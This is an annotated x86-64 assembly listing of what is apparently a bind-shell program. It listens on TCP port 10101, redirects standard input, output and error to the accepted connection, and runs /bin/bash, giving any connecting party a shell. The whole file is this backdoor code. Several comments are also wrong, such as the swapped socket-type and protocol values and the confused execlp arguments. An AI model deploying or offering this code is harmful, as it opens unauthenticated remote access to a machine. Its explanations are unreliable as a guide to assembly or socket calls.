sin:
    .zero 16  ; Allocate 16 bytes of memory for the `sin` structure
sock:
    .zero 4   ; Allocate 4 bytes of memory for the `sock` variable (socket file descriptor)
fd:
    .zero 4   ; Allocate 4 bytes of memory for the `fd` variable (file descriptor)

.LC0:
    .string "/bin/bash"  ; Define a string literal containing the path to the `/bin/bash` shell

bash:
    .quad   .LC0  ; Define a quadword (64-bit integer) variable `bash` pointing to the `.LC0` string (path to `/bin/bash`)

main:
    push    rbp  ; Push the base pointer (RBP) of the current stack frame onto the stack

    mov     rbp, rsp  ; Set the base pointer (RBP) to the stack pointer (RSP)

    ; Initialize the `sin` structure for the server address

    mov     eax, AF_INET  ; Set `eax` to the value of `AF_INET` (IPv4 address family)
    mov     WORD PTR sin[rip], ax  ; Store `eax` (AF_INET) in the `sin_family` field of the `sin` structure
    mov     edi, 10101  ; Set `edi` to the port number (10101)
    call    htons  ; Convert the port number from host byte order to network byte order
    mov     WORD PTR sin[rip+2], ax  ; Store the converted port number in the `sin_port` field of the `sin` structure

    ; Create a socket for the server

    mov     edx, 6       ; Set `edx` to the value of `SOCK_STREAM` (stream socket type)
    mov     esi, 1       ; Set `esi` to the value of `IPPROTO_TCP` (TCP protocol)
    mov     edi, 2       ; Set `edi` to the value of `AF_INET` (IPv4 address family)
    call    socket  ; Create a socket and store its file descriptor in `eax`
    mov     DWORD PTR sock[rip], eax  ; Store the socket file descriptor in the `sock` variable

    ; Bind the socket to the server address

    mov     edx, 16       ; Set `edx` to the size of the `sin` structure (16 bytes)
    mov     esi, OFFSET FLAT:sin  ; Set `esi` to the offset of the `sin` structure in memory
    mov     edi, eax     ; Set `edi` to the socket file descriptor
    call    bind  ; Bind the socket to the specified address and port

    ; Listen for incoming connections on the socket

    mov     eax, DWORD PTR sock[rip]  ; Set `eax` to the socket file descriptor
    mov     esi, 1       ; Set `esi` to the backlog size (maximum number of pending connections)
    mov     edi, eax     ; Set `edi` to the socket file descriptor
    call    listen  ; Listen for incoming connections on the socket

    ; Accept an incoming connection on the socket

    mov     eax, DWORD PTR sock[rip]  ; Set `eax` to the socket file descriptor
    mov     edx, 0       ; Set `edx` to NULL (unused for client address)
    mov     esi, 0       ; Set `esi` to 0 (unused for client address length)
    mov     edi, eax     ; Set `edi` to the socket file descriptor
    call    accept  ; Accept an incoming connection and store the client socket file descriptor in `eax`
    mov     DWORD PTR fd[rip], eax  ; Store the client socket file descriptor in the `fd` variable

    ; Duplicate the client socket file descriptor for standard input (stdin)

    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
    mov     esi, 0       ; Set `esi` to 0 (standard input descriptor)
    mov     edi, eax     ; Set `edi` to the client socket file descriptor
    call    dup2  ; Duplicate the client socket file descriptor and redirect it to standard input

    ; Duplicate the client socket file descriptor for standard output (stdout)

    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
    mov     esi, 1       ; Set `esi` to 1 (standard output descriptor)
    mov edi, eax  ; Set `edi` to the client socket file descriptor
    call  dup2  ; Duplicate the client socket file descriptor and redirect it to standard output

    ; Duplicate the client socket file descriptor for standard error (stderr)
    

    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
    mov     esi, 2       ; Set `esi` to 2 (standard error descriptor)
    mov     edi, eax     ; Set `edi` to the client socket file descriptor
    call    dup2  ; Duplicate the client socket file descriptor and redirect it to standard error

    ; Execute the `/bin/bash` shell

    mov     rcx, QWORD PTR bash[rip]  ; Set `rcx` to the address of the `/bin/bash` path stored in `bash`
    mov     rax, QWORD PTR bash[rip]  ; Set `rax` to the address of the `/bin/bash` path stored in `bash` (redundant)
    mov     rdx, NULL                 ; Set `rdx` to NULL for default environment variables
    mov     rsi, rcx                 ; Set `rsi` to the address of the argument array (currently empty)
    mov     rdi, rax                 ; Set `rdi` to the address of the `/bin/bash` path
    mov     eax, 0                   ; Set `eax` to 0 (arguments for `execlp`)
    call    execlp                   ; Replace current process with `/bin/bash`

    ; If execlp fails, jump to error handling (not implemented here)
;   cmp     eax, 0
;   jne    error

    mov     eax, 0                   ; Set `eax` to 0 (exit code)

    pop     rbp                      ; Restore the base pointer (RBP) from the stack

    ret                             ; Return from the `main` function
